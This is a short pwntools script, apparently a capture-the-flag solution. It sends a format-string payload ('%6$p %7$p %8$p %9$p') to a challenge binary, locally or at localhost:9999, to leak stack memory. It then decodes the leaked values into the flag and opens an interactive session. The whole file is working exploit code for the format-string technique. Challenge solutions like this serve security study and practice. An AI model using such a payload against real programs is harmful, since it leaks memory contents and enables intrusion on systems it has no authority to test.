#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
exe = 'src/chall'

# sol only applies for remote
if args.REMOTE:
    p = remote('localhost', 9999)   
else:
    p = process(exe)


l = context.binary = ELF(exe, checksec=False)



p.sendlineafter(b'?\n', b'%6$p %7$p %8$p %9$p')
p.recvuntil(b'feel')
p.recvline()

flag = p.recvline().strip().split(b' ')
flag = (b''.join(int(x, 16).to_bytes(8, 'little') for x in flag)).decode()

print(flag)
p.interactive()